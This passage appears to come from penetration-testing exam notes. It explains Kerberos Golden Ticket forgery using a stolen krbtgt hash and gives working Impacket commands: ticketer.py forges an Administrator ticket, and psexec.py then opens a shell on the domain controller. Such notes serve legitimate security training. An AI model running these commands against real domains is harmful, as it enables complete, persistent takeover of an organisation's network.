**The `krbtgt` account's hash is the master key that signs every Kerberos ticket in the domain.** Once you've dumped it (via DCSync), you can forge a "Golden Ticket" — a ticket claiming to be _anyone_, including a Domain Admin, valid for years. It's mainly a persistence trick; on the exam you'll usually already own the DC by this point, but it proves total, lasting control of the domain.

```
# Requirements: krbtgt NTLM hash + Domain SID
ticketer.py -nthash <KRBTGT_NTLM_HASH> \
    -domain-sid S-1-5-21-XXX-XXX-XXX \
    -domain corp.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.local/Administrator@<DC_FQDN>
```